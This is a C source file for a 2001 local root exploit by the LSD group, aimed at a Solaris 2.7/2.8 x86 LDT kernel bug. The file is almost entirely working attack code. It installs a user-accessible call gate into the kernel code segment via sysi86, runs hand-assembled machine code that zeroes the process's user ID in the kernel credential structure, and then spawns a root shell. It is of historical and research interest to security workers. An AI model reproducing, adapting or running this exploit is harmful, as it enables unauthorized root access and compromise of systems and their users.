/*## copyright LAST STAGE OF DELIRIUM apr 2001 poland        *://lsd-pl.net/ #*/
/*## ldt kernel bug                                                          #*/

/*   the code installs trap call gate descriptor with DPL=3 targeting kernel  */
/*   code segment selector KCSSEL (DPL=0) in task local descriptor table LDT  */
/*   through sysi86(SI86DSCR,struct ssd*) system call.                        */

/*   as a result command shell is spawned with effective root user privilege. */
/*   NOTE: possible direct jump to user space adr=(unsigned int)&asmcode[21]; */

#include <sys/types.h>
#include <sys/sysi86.h>
#include <sys/segment.h>
#include <sys/cpuvar.h>
#include <sys/thread.h>
#include <sys/cred.h>
#include <ucontext.h>

#define ofs(s,m) (unsigned int)(&(((s*)0)->m))
#define ofskt()  (ofs(cpu_t,cpu_thread))
#define ofscr()  (ofs(kthread_t,t_cred))
#define ofsid()  (ofs(cred_t,cr_uid))
#define adr(a)   (char)(a),(char)(a>>8),(char)(a>>16),(char)(a>>24)
#define dsc(d)   (char)(d),(char)(d>>8)

char asmcode[]={
    0x55,                      /* pushl   %ebp                   */
    0x89,0xe5,                 /* movl    %esp,%ebp              */
    0xe8,0,0,0,0,              /* call    <asmcode+8>            */ 
    0x5c,                      /* popl    %esp                   */
    0x83,0xc4,0x0d,            /* addl    $0x0d,%esp             */
    0x9a,0,0,0,0,0x44,0,       /* lcall   $0x44,$0x00000000      */
    0xc9,                      /* leave                          */
    0xc3,                      /* ret                            */

    0x66,0xb8,dsc(KGSSEL),     /* movw    $0x????,%ax            */
    0x8e,0xe8,                 /* movw    %ax,%gs                */
    0x65,0xa1,adr(ofskt()),    /* movl    %gs:0x????????,%eax    */
    0x8b,0x88,adr(ofscr()),    /* movl    0x????????(%eax),%ecx  */
    0x31,0xc0,                 /* xorl    %eax,%eax              */
    0x89,0x41,ofsid(),         /* movl    %eax,0x??(%ecx)        */
    0xca,0x20,0                /* lret    $0x20                  */
};

main(int argc,char **argv){
    unsigned int adr;
    ucontext_t uc;struct ssd s;

    printf("copyright LAST STAGE OF DELIRIUM apr 2001 poland  //lsd-pl.net/\n");
    printf("ldt kernel bug for solaris 2.7 2.8 x86\n\n");

    getcontext(&uc);
    adr=uc.uc_mcontext.gregs[ESP]+12+4+4-(8<<2);

    printf("esp=0x%08x adr=0x%08x\n",uc.uc_mcontext.gregs[ESP],adr);

    s.bo=adr;
    s.sel=0x44;
    s.ls=KCSSEL;
    s.acc1=GATE_UACC|GATE_386CALL;
    s.acc2=8;

    sysi86(SI86DSCR,&s);
    setuid(getuid());
    ((void(*)())asmcode)();

    execl("/bin/ksh","lsd",0);
}

